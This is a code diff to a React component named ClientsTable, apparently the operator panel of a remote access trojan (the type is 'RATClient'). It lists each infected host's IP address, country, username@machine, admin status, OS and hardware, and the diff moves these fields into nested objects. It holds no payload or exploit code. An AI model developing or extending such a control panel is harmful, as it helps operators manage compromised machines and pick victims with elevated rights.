@@ -28,11 +28,11 @@ export const ClientsTable = ({
   filters: FilterCategories;
 }) => {
   const getOsIcon = ({ client }: { client: RATClient }) => {
-    if (client.os.toLowerCase().includes("windows")) {
+    if (client.system.os_full_name.toLowerCase().includes("windows")) {
       return <IconBrandWindows size={20} className="text-blue-400" />;
     } else if (
-      client.os.toLowerCase().includes("linux") ||
-      client.os.toLowerCase().includes("ubuntu")
+      client.system.os_full_name.toLowerCase().includes("linux") ||
+      client.system.os_full_name.toLowerCase().includes("ubuntu")
     ) {
       return <IconBrandUbuntu size={20} className="text-orange-400" />;
     } else {
@@ -120,12 +120,12 @@ export const ClientsTable = ({
               <>
                 {filteredClients.map((client) => (
                   <tr
-                    key={client.addr}
+                    key={client.data.addr}
                     onContextMenu={(e) =>
                       handleContextMenu(
                         e as any,
-                        client.addr,
-                        `${client.username}@${client.hostname}`
+                        client.data.addr,
+                        `${client.system.username}@${client.system.machine_name}`
                       )
                     }
                     onClick={() => setSelectedClientDetails(client)}
@@ -134,20 +134,21 @@ export const ClientsTable = ({
                     }`}
                   >
                     <td className="border-b border-accentx py-4 pr-3 pl-4 font-medium whitespace-nowrap text-white sm:pl-6 lg:pl-8">
-                      {client.addr}
+                      {client.data.addr}
                     </td>
                     <td className="hidden border-b border-accentx px-3 py-4 whitespace-nowrap text-white sm:table-cell">
-                      {client.group}
+                      {client.data.group}
                     </td>
                     <td className="hidden border-b border-accentx px-3 py-4 whitespace-nowrap text-white sm:table-cell">
-                      {client.country_code && client.country_code !== "N/A" ? (
+                      {client.data.country_code &&
+                      client.data.country_code !== "N/A" ? (
                         <div className="flex items-center gap-2">
                           <img
-                            src={getCountryFlagPath(client.country_code)}
-                            alt={client.country_code}
+                            src={getCountryFlagPath(client.data.country_code)}
+                            alt={client.data.country_code}
                             className="w-6 h-4 object-cover"
                           />
-                          <span>{client.country_code}</span>
+                          <span>{client.data.country_code}</span>
                         </div>
                       ) : (
                         "N/A"
@@ -156,38 +157,47 @@ export const ClientsTable = ({
                     <td className="hidden border-b border-accentx px-3 py-4 whitespace-nowrap text-white sm:table-cell">
                       <div className="flex items-center gap-3">
                         {getOsIcon({ client })}
-                        {client.username}@{client.hostname}
+                        {client.system.username}@{client.system.machine_name}
                       </div>
                     </td>
                     <td className="hidden border-b border-accentx px-3 py-4 whitespace-nowrap text-white lg:table-cell">
-                      {client.is_elevated ? "Admin" : "User"}
+                      {client.system.is_elevated ? "Admin" : "User"}
                     </td>
                     <td className="border-b border-accentx px-3 py-4 whitespace-nowrap text-white">
-                      {client.os}
+                      {client.system.os_full_name}
                     </td>
                     <td className="border-b border-accentx px-3 py-4 whitespace-nowrap text-white">
                       <div className="flex items-center gap-2">
                         <div
                           className="tooltip tooltip-left"
-                          data-tip={client.cpu}
+                          data-tip={client.cpu.cpu_name}
                         >
                           <CpuSvg />
                         </div>
                         <div
                           className="tooltip tooltip-left"
-                          data-tip={client.ram}
+                          data-tip={`${client.ram.total_gb.toFixed(2)} GB`}
                         >
                           <RamSvg />
                         </div>
                         <div
                           className="tooltip tooltip-left"
-                          data-tip={fetchGpus(client.gpus)}
+                          data-tip={client.gpus
+                            .map((gpu) => gpu.name)
+                            .join(", ")}
                         >
                           <GpuSvg />
                         </div>
                         <div
                           className="tooltip tooltip-left"
-                          data-tip={client.storage}
+                          data-tip={client.drives
+                            .map(
+                              (drive) =>
+                                `${drive.model} (${drive.size_gb.toFixed(
+                                  2
+                                )} GB)`
+                            )
+                            .join(", ")}
                         >
                           <StorageSvg />
                         </div>
